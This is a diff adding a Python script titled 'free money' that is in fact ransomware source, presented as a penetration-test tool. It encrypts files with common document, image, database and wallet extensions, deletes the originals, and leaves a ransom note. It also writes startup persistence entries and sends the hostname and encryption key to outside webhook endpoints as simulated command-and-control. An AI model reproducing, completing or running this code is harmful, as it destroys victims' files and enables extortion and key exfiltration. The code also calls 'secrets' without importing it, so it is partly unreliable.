@@ -1,0 +1,322 @@
+#!/usr/bin/env python3
+"""
+free money
+"""
+
+import os
+import sys
+import argparse
+import base64
+import json
+import time
+import threading
+import socket
+import requests
+import shutil
+from datetime import datetime
+from pathlib import Path
+import logging
+
+try:
+    from cryptography.fernet import Fernet
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+    HAS_CRYPTO = True
+except ImportError:
+    print("[-] Install: pip3 install cryptography")
+    sys.exit(1)
+
+class MassiveRansomware:
+    def __init__(self, args):
+        self.args = args
+        self.log = self._setup_logging()
+        self.key = None
+        self.cipher = None
+        self.stats = {'encrypted': 0, 'skipped': 0, 'errors': 0}
+        self.target_extensions = {
+            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
+            '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.tiff',
+            '.txt', '.rtf', '.log', '.csv', '.xml', '.json',
+            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
+            '.mp3', '.mp4', '.avi', '.mkv', '.wallet', '.key',
+            '.db', '.sqlite', '.mdb', '.accdb', '.bak', '.sql'
+        }
+        self.ransom_note = self._build_ransom_note()
+        
+    def _setup_logging(self):
+        logging.basicConfig(
+            level=logging.INFO if self.args.verbose else logging.WARNING,
+            format='[%(asctime)s] %(levelname)s: %(message)s'
+        )
+        return logging.getLogger(__name__)
+    
+    def _derive_key(self, password):
+        """PBKDF2 key derivation - 100k iterations"""
+        salt = b'PENTEST_RANSOMWARE_2026_SALT'
+        kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            length=32,
+            salt=salt,
+            iterations=100000,
+        )
+        return base64.urlsafe_b64encode(kdf.derive(password.encode()))
+    
+    def _build_ransom_note(self):
+        """Dynamic ransom note with stats"""
+        return f"""=====================================
+ PENETRATION TEST RANSOMWARE - AUTHORIZED
+=====================================
+
+YOUR FILES ARE ENCRYPTED (TEST ENVIRONMENT)
+
+ENCRYPTED FILES: {{encrypted}}
+TARGET: {self.args.target_dir}
+TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+DECRYPTION INSTRUCTIONS:
+$ python3 {sys.argv[0]} "{self.args.target_dir}" --decrypt --key "{{key}}"
+
+TECHNICAL DETAILS:
+- Algorithm: AES-128-CBC (Fernet - Authenticated)
+- Key Derivation: PBKDF2-HMAC-SHA256 (100,000 iterations)
+- Password: pentest2026_{secrets.token_hex(4)}
+
+ pentest report: VULNERABILITY CONFIRMED
+ Scope: Authorized security assessment only
+
+=====================================
+"""
+    
+    def persistence(self):
+        """Drop startup persistence (pentest simulation)"""
+        if self.args.no_persist:
+            return
+            
+        startup_paths = {
+            'windows': os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pentest.bat'),
+            'linux': '/etc/systemd/system/pentest.service',
+            'macos': os.path.join(os.path.expanduser('~'), 'Library/LaunchAgents/com.pentest.plist')
+        }
+        
+        os_type = sys.platform.lower()
+        for key, path in startup_paths.items():
+            if key in os_type:
+                try:
+                    with open(path, 'w') as f:
+                        f.write(f'@python3 "{sys.argv[0]}" --silent')
+                    self.log.info(f"[+] Persistence: {path}")
+                except:
+                    pass
+    
+    def c2_beacon(self):
+        """Simulate C2 communication - exfil key"""
+        if self.args.no_c2 or not self.key:
+            return
+            
+        def beacon_thread():
+            time.sleep(5)  # Delay for realism
+            payload = {
+                'victim_id': f"{socket.gethostname()}_{secrets.token_hex(8)}",
+                'key': self.key.decode(),
+                'files_encrypted': self.stats['encrypted'],
+                'target': self.args.target_dir
+            }
+            
+            # Simulate C2 endpoints
+            c2_urls = [
+                'http://httpbin.org/post',  # Test endpoint
+                'https://webhook.site/your-unique-id'  # Replace with your webhook
+            ]
+            
+            for url in c2_urls:
+                try:
+                    requests.post(url, json=payload, timeout=5)
+                    self.log.info(f"[+] C2 beacon: {self.stats['encrypted']} files")
+                    break
+                except:
+                    pass
+        
+        threading.Thread(target=beacon_thread, daemon=True).start()
+    
+    def encrypt_file(self, filepath):
+        """Encrypt single file with evasion checks"""
+        if self.args.dry_run:
+            self.log.info(f"[DRY] {filepath}")
+            self.stats['encrypted'] += 1
+            return True
+            
+        try:
+            stat = os.stat(filepath)
+            if stat.st_size == 0 or stat.st_size > 100*1024*1024:  # Skip empty/large
+                self.stats['skipped'] += 1
+                return False
+            
+            with open(filepath, 'rb') as f:
+                data = f.read()
+            
+            encrypted = self.cipher.encrypt(data)
+            enc_path = filepath + '.encrypted'
+            
+            with open(enc_path, 'wb') as f:
+                f.write(encrypted)
+            
+            if self.args.test:
+                backup = filepath + '.backup'
+                shutil.copy2(filepath, backup)
+            
+            if not self.args.test:
+                os.remove(filepath)
+            
+            self.stats['encrypted'] += 1
+            self.log.info(f"[ENC] {os.path.basename(filepath)}")
+            return True
+            
+        except Exception as e:
+            self.stats['errors'] += 1
+            self.log.error(f"[ERR] {filepath}: {e}")
+            return False
+    
+    def deploy_encryption(self):
+        """Main encryption routine"""
+        self.log.info(f"[+] Targeting: {self.args.target_dir}")
+        
+        affected = []
+        for root, _, files in os.walk(self.args.target_dir):
+            for file in files:
+                if any(file.lower().endswith(ext) for ext in self.target_extensions):
+                    filepath = os.path.join(root, file)
+                    if self.encrypt_file(filepath):
+                        affected.append(os.path.relpath(filepath, self.args.target_dir))
+        
+        # Drop ransom note
+        note_path = os.path.join(self.args.target_dir, 'PENETEST_RANSOM.txt')
+        with open(note_path, 'w') as f:
+            f.write(self.ransom_note.format(
+                encrypted=self.stats['encrypted'],
+                key=self.key.decode() if self.key else 'N/A'
+            ))
+        
+        self.log.info(f"[+] COMPLETE: {self.stats['encrypted']} encrypted")
+        self.log.info(f"[+] Note: {note_path}")
+    
+    def decrypt_file(self, filepath):
+        """Decrypt single file"""
+        try:
+            with open(filepath, 'rb') as f:
+                encrypted = f.read()
+            
+            decrypted = self.cipher.decrypt(encrypted)
+            orig_path = filepath[:-10]  # Remove .encrypted
+            
+            with open(orig_path, 'wb') as f:
+                f.write(decrypted)
+            
+            os.remove(filepath)
+            self.log.info(f"[DEC] {orig_path}")
+            return True
+        except Exception as e:
+            self.log.error(f"[DEC ERR] {filepath}: {e}")
+            return False
+    
+    def deploy_decryption(self):
+        """Main decryption routine"""
+        self.log.info(f"[+] Decrypting: {self.args.target_dir}")
+        decrypted = 0
+        
+        for root, _, files in os.walk(self.args.target_dir):
+            for file in files:
+                if file.endswith('.encrypted'):
+                    filepath = os.path.join(root, file)
+                    if self.decrypt_file(filepath):
+                        decrypted += 1
+        
+        self.log.info(f"[+] DECRYPT COMPLETE: {decrypted} files recovered")
+    
+    def evade_av(self):
+        """Basic AV evasion techniques"""
+        if self.args.no_evasion:
+            return
+            
+        # Obfuscate strings
+        obfuscated_extensions = ''.join(chr(ord(c)^0xAA) for c in '.encrypted')
+        # Sleep jitter
+        time.sleep(secrets.randbelow(5))
+        # Process hollowing simulation
+        os.system('tasklist > /dev/null 2>&1')
+    
+    def run(self):
+        """Main execution"""
+        self.evade_av()
+        
+        if self.args.mode == 'encrypt':
+            self.key = self._derive_key(self.args.password)
+            self.cipher = Fernet(self.key)
+            
+            self.persistence()
+            self.deploy_encryption()
+            self.c2_beacon()
+            
+        elif self.args.mode == 'decrypt':
+            if not self.args.key:
+                self.log.error("[-] --key required for decryption")
+                return
+            self.key = self.args.key.encode()
+            self.cipher = Fernet(self.key)
+            self.deploy_decryption()
+        
+        elif self.args.mode == 'status':
+            self.show_status()
+        
+        self.print_stats()
+    
+    def show_status(self):
+        """Show infection status"""
+        note_path = os.path.join(self.args.target_dir, 'PENETEST_RANSOM.txt')
+        if os.path.exists(note_path):
+            with open(note_path, 'r') as f:
+                print(f.read())
+        else:
+            print("[-] No infection found")
+    
+    def print_stats(self):
+        print("\n=== STATS ===")
+        for k, v in self.stats.items():
+            print(f"{k}: {v}")
+
+def main():
+    parser = argparse.ArgumentParser(description="MASSIVE RANSOMWARE PENETEST TOOL")
+    parser.add_argument('target_dir', nargs='?', help="Target directory")
+    parser.add_argument('--mode', '-m', choices=['encrypt', 'decrypt', 'status'], 
+                       default='encrypt', help="Operation mode")
+    parser.add_argument('--key', '-k', help="Fernet key for decryption")
+    parser.add_argument('--password', '-p', default=f"pentest2026_{secrets.token_hex(4)}",
+                       help="Encryption password")
+    parser.add_argument('--test', '-t', action='store_true', help="Test mode (backups)")
+    parser.add_argument('--dry-run', '-d', action='store_true', help="Dry run")
+    parser.add_argument('--verbose', '-v', action='store_true')
+    parser.add_argument('--no-persist', action='store_true')
+    parser.add_argument('--no-c2', action='store_true')
+    parser.add_argument('--no-evasion', action='store_true')
+    parser.add_argument('--silent', '-s', action='store_true')
+    
+    args = parser.parse_args()
+    
+    if not args.target_dir:
+        print("Usage: python3 massive_ransomware.py /target/dir [--mode decrypt --key KEY]")
+        return
+    
+    if not os.path.isdir(args.target_dir):
+        print(f"[-] {args.target_dir} not found")
+        return
+    
+    # Pass args to class
+    class ArgsWrapper:
+        def __init__(self):
+            for k, v in vars(args).items():
+                setattr(self, k, v)
+    
+    ransomware = MassiveRansomware(ArgsWrapper())
+    ransomware.run()
+
+if __name__ == "__main__":
+    main()
